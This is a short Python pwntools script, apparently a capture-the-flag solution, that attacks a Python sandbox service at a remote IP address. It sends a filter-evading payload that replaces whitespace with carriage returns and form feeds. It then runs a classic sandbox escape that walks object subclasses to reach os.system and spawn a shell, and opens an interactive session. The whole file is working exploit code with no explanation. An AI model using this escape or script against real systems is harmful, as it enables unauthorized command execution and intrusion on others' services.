from pwn import *

#conn = process(["python3", "main.py"])
conn = remote('34.32.216.108', 1337)

payload = '''
try: a
except NameError as canary: canary
'''.replace("\n", "\r").replace(" ", "\x0c").strip().encode()
print(payload)

conn.sendline(payload)
conn.sendline(b'[n for n in ().__class__.__base__.__subclasses__() if "_wrap_close" in n.__name__][0].__init__.__globals__["system"]("sh")')
conn.interactive()
